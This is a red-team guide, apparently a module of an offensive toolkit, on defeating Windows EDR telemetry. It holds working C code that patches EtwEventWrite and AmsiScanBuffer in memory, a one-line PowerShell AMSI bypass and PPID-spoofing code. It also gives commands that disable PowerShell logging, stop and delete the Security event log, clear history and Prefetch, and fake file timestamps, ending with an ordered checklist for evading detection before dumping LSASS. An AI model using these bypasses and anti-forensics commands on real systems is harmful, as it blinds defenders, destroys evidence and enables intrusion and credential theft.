# Telemetry Blinding: ETW / AMSI / Anti-Forensics

> Authorized red team / adversarial exercises / own-product testing only; use against unauthorized targets is forbidden.

The EDR's detection capability relies heavily on the ETW (Event Tracing for Windows) and AMSI (Antimalware Scan Interface) telemetry pipelines.
This document summarizes red team countermeasures against both pipelines, and supplements anti-forensics combinations such as Sysmon / PowerShell logging / timestamp spoofing.

Mapped to MITRE ATT&CK: T1562.001 / T1562.002 / T1562.006 / T1070 / T1027.

## 1. ETW Internals

ETW is Windows' built-in high-performance event tracing framework; EDRs use it as "lightweight kernel telemetry".
The providers red teams care most about:

| Provider GUID | Name | Who Uses It |
|--------------|------|--------|
| `{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}` | Microsoft-Windows-Threat-Intelligence (ETW-TI) | Defender, MDE, third-party EDRs |
| `{A0C1853B-5C40-4B15-8766-3CF1C58F985A}` | Microsoft-Antimalware-Scan-Interface | Defender AMSI reporting |
| `{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}` | Microsoft-Windows-Kernel-Process | Process / thread basic events |
| `{2839FF94-8F12-4E1B-82E3-AF7AF77A450F}` | Microsoft-Windows-DotNETRuntime | .NET loading, JIT |
| `{E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}` | .NET CLR | CLR startup |

### Key User-Mode APIs

| API | DLL | Purpose |
|-----|-----|------|
| `EtwEventWrite` | `ntdll.dll` | Write events (most common) |
| `EtwEventWriteFull` | `ntdll.dll` | Events with an activity ID |
| `EtwEventWriteEx` | `ntdll.dll` | Extended version |
| `NtTraceEvent` | `ntdll.dll` | The layer beneath EtwEventWrite |
| `NtTraceControl` | `ntdll.dll` | Control the trace session (start/stop/query providers) |
| `EtwEventEnabled` | `ntdll.dll` | Whether the provider is enabled |
| `EtwEventRegister` | `ntdll.dll` | Register a provider |

### Call Chain

```text
Application code EventWrite(...)
  → Microsoft wrapper (TraceLogging API)
  → ntdll!EtwEventWrite[Full|Ex]
  → ntdll!NtTraceEvent (syscall)
  → nt!NtTraceEvent (kernel)
  → kernel ETW core → consumers (the EDR user-mode process subscribes to the session)
```

## 2. ETW Patch — Three Methods

### Method A: EtwEventWrite head patch

Directly change the `ntdll!EtwEventWrite` entry point to return success immediately:

```text
Original:
  4C 8B DC                 mov r11, rsp
  48 81 EC 88 00 00 00     sub rsp, 88h
  ...

After the patch (x64):
  33 C0                    xor eax, eax       ; STATUS_SUCCESS = 0
  C3                       ret
```

C code:

```c
#include <windows.h>

BOOL PatchEtwEventWrite(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    FARPROC pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtw) return FALSE;

    BYTE patch[] = { 0x33, 0xC0, 0xC3 };   // xor eax,eax; ret
    DWORD oldProt = 0;

    // Note: VirtualProtect itself may be hooked -> use the indirect syscall version
    if (!VirtualProtect(pEtw, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt))
        return FALSE;

    memcpy(pEtw, patch, sizeof(patch));

    VirtualProtect(pEtw, sizeof(patch), oldProt, &oldProt);
    return TRUE;
}
```

**OPSEC warning**: writing ntdll memory is itself an `ALPC_MODIFY_PROCESS` / `PROTECTVM` event source monitored by ETW-TI.
You must **first use the indirect syscall + bypass the NtProtectVirtualMemory hook, and only then patch**,
otherwise the EDR has already received the alert before the patch takes effect.

### Method B: EtwEventEnabled always-false

More stealthy: do not modify `EtwEventWrite`; instead make `EtwEventEnabled` always return FALSE,
the application layer judges "provider not enabled" on its own → never calls `EtwEventWrite`, friendlier to in-memory hash integrity checks (many EDRs verify the `EtwEventWrite` bytes).

```c
// EtwEventEnabled normally returns BOOLEAN (1 byte)
BYTE patch[] = { 0x32, 0xC0, 0xC3 };   // xor al,al; ret
```

### Method C: NtTraceControl to stop the provider

Use the syscall to directly stop the EDR session (intrusive, but leaves ntdll bytes untouched):

```c
// NtTraceControl(EtwpStopTrace, ...)
// Needs SeSystemProfilePrivilege or higher
// Applies after Local Admin + UAC bypass
```

Rarely used in practice, because:

- Stopping the session itself triggers an "ETW provider stopped" event sensed by another pipeline
- Needs high privileges

### Method D: Kernel-mode ETW patch (only when BYOVD/kernel read-write already exists)

```text
nt!EtwpEventTracingProviderEnableInfo
nt!EtwThreatIntProvRegHandle
Zero them directly so all ETW-TI events are dropped
```

This belongs to the attack-chain's BYOVD stage; this skill does not go deeper.

## 3. AMSI Bypass

AMSI is the interface Windows gives PowerShell / .NET / WMI / VBA for antivirus scanning before executing scripts.
The most common red team encounter is PowerShell + AMSI.

### Classic AmsiScanBuffer Patch

```c
// Write at the amsi.dll!AmsiScanBuffer entry:
//   mov eax, 0x80070057     ; E_INVALIDARG
//   ret 4                    ; (32-bit) or ret (64-bit)

BOOL PatchAmsi(void) {
    HMODULE h = LoadLibraryA("amsi.dll");
    if (!h) return FALSE;
    FARPROC p = GetProcAddress(h, "AmsiScanBuffer");
    if (!p) return FALSE;

    BYTE patch64[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80,   // mov eax, 0x80070057
        0xC3                              // ret
    };
    DWORD old = 0;
    VirtualProtect(p, sizeof(patch64), PAGE_EXECUTE_READWRITE, &old);
    memcpy(p, patch64, sizeof(patch64));
    VirtualProtect(p, sizeof(patch64), old, &old);
    return TRUE;
}
```

One-line PowerShell version (detection-evasion reference only; signatures / Defender block it themselves):

```powershell
# Concept demo — real environments must pair with obfuscation / HWBP
[Ref].Assembly.GetType('System.Management.Automation.'+$([char]65+'msi'+'Utils')).GetField($([char]97+'msiInitFailed'),'NonPublic,Static').SetValue($null,$true)
```

### Advanced Option 1: Hardware Breakpoint AMSI Bypass

Do not touch amsi.dll memory (does not trigger integrity scans):

1. AddVectoredExceptionHandler
2. Set `DR0` at the `AmsiScanBuffer` entry
3. When the VEH hits, set `RAX = 0x80070057`, `RIP = the address of the ret instruction`, `RSP += 8`
4. ContinueExecution

This shares the same infrastructure as unhook-techniques.md's HWBP Blindside; both can share the VEH.

### Advanced Option 2: AmsiContext / AmsiSession Corruption

Craft a malformed `AmsiContext` structure so `AmsiScanBuffer` returns success early because the integrity check fails:

```text
// The AmsiContext header should be the "AMSI" magic number
// Change it to "XXXX" → AmsiScanBuffer's internal integrity check fails but it returns S_OK + AMSI_RESULT_CLEAN
```

### Advanced Option 3: Reflectively Load a Clean Copy of amsi.dll

Do not use the system amsi.dll; reflectively load a clean copy into your own process and redirect the PowerShell engine's calls to AMSI.
Suited to advanced EDRs that already intercept PowerShell.exe startup at the loading stage.

## 4. Anti-Forensics: Clearing Traces

### Turning Off PowerShell ScriptBlock Logging

```powershell
# Registry (needs administrator)
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' `
    -Name 'EnableScriptBlockLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' `
    -Name 'EnableModuleLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' `
    -Name 'EnableTranscripting' -Value 0 -Force

# Group Policy path:
# Computer Configuration → Administrative Templates → Windows Components →
#   Windows PowerShell → Turn on PowerShell Script Block Logging = Disabled
```

### Clearing PowerShell History

```powershell
# Current session
Clear-History
# Persistent history (PSReadLine)
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
```

### Clearing Prefetch

```powershell
# Needs SYSTEM
Remove-Item 'C:\Windows\Prefetch\implant*.pf' -Force
# Clear everything (large action, use with care)
# Remove-Item 'C:\Windows\Prefetch\*.pf' -Force
```

### Clearing the ETL Log

```powershell
# Stop the session, then delete the etl
logman stop "EventLog-Security" -ets
Remove-Item 'C:\Windows\System32\winevt\Logs\Security.evtx' -Force -ErrorAction SilentlyContinue
# Note: deleting the .evtx directly will have it recreated by the Event Log Service, which writes a "log cleared" event (Event ID 1102)
# More stealthy: patch the wevtsvc.dll EventLog API in memory (belongs to T1070.001)
```

### Timestamp Spoofing (T1070.006)

```powershell
$f = 'C:\Windows\Temp\implant.dll'
$ref = 'C:\Windows\System32\notepad.exe'
(Get-Item $f).CreationTime   = (Get-Item $ref).CreationTime
(Get-Item $f).LastWriteTime  = (Get-Item $ref).LastWriteTime
(Get-Item $f).LastAccessTime = (Get-Item $ref).LastAccessTime
```

## 5. Sysmon Monitoring Evasion

Sysmon is the community's most common free telemetry (many enterprises use the olaf configuration).
Key events:

| Event ID | Meaning |
|----------|------|
| 1 | ProcessCreate (includes PPID, CommandLine, Hash) |
| 7 | ImageLoad (DLL loading) |
| 8 | CreateRemoteThread |
| 10 | ProcessAccess (OpenProcess) |
| 11 | FileCreate |
| 12/13/14 | Registry |
| 22 | DNS Query |
| 25 | ProcessTampering (image hollowing) |

### Evasion Ideas

1. **Do not create new processes** — act entirely inside an already-injected process, avoiding Event ID 1
2. **PPID Spoof** — use `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)` to set the PPID to `explorer.exe`, making Sysmon ProcessCreate look legitimate

```c
STARTUPINFOEX si = {0};
PROCESS_INFORMATION pi = {0};
SIZE_T size = 0;
HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, g_explorerPid);

si.StartupInfo.cb = sizeof(STARTUPINFOEX);
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
UpdateProcThreadAttribute(si.lpAttributeList, 0,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
    EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
```

3. **Unbacked memory + untouched image** — the new Sysmon already captures Process Hollowing with Event ID 25.
   Prefer **module stomping** (overwrite a section of an already-loaded legitimate DLL) or newer techniques like **dirty vanity**,
   paired with PPID spoofing
4. **No remote threads** — avoid Event ID 8; use `NtCreateThreadEx` to execute inside your own process / APC / Early Bird APC
5. **DNS over DoH / HTTPS** — avoid Event ID 22

## 6. Call Stack Spoofing + Timestamps, Making Events Look Like Legitimate Software

Even when ProcessCreate cannot avoid firing (some scenarios must spawn a child), you can:

- Change the CommandLine into a format similar to some legitimate software
- PPID spoof to services.exe (disguise as a service started by SCM)
- Modify the image hash ImageLoad sees: through module stomping, place implant code inside a signed DLL's memory space
- Pair with CallStackSpoofer: even with EnableCallTracing on, Sysmon cannot see implant frames

## 7. Field OPSEC: Operation Order

**The wrong order means the EDR receives the alert first**, and follow-up actions get cut off directly.

Correct order:

```text
1. AMSI bypass (HWBP first, avoid writing amsi.dll)
   ─── let .NET / PowerShell load the implant without being scanned
2. ETW patch (patch EtwEventWrite first, then do any syscall)
   ─── kill the telemetry of your own follow-up actions
3. NtProtectVirtualMemory called with the indirect syscall
   ─── prepare the "safe" memory-protection switch channel
4. Unhook ntdll (Peruns Fart) or enable the indirect syscall
   ─── wipe out user-mode hooks
5. Call stack spoof setup
   ─── prepare the fake stack for all subsequent syscalls
6. Actual payload execution (injection / lateral / dump LSASS)
7. Clean traces (PowerShell history / Prefetch / timestamps)
```

Wrong-order example:

```text
❌ Unhook ntdll first → ETW-TI immediately reports PROTECTVM + module modification → SOC has already received the alert
❌ Dump LSASS first → AMSI / ETW both still unpressed → high-confidence T1003.001 alert
✅ AMSI → ETW → unhook → spoof → payload
```

## References

- ETW Threat Intelligence Provider: <https://learn.microsoft.com/en-us/windows/win32/etw/event-tracing-portal>
- ETW Patching overview: <https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/>
- AMSI Bypass collection: <https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell>
- Sysmon olaf configuration: <https://github.com/olafhartong/sysmon-modular>
- PPID Spoofing: <https://blog.didierstevens.com/2017/03/20/>
- Ekko sleep mask: <https://github.com/Cracked5pider/Ekko>
- Foliage sleep obfuscation: <https://github.com/SecIdiot/FOLIAGE>
- MITRE T1562.002 (Disable Windows Event Logging): <https://attack.mitre.org/techniques/T1562/002/>
- MITRE T1562.006 (Indicator Blocking): <https://attack.mitre.org/techniques/T1562/006/>
- MITRE T1070 (Indicator Removal): <https://attack.mitre.org/techniques/T1070/>

## Routing Callback

After completing the three-piece set (hook survey → unhook → telemetry blinding), return to `SKILL.md` Step 5 to validate in the sandbox,
then enter the next stage per the `attack-chain/` initial access and lateral movement sections.
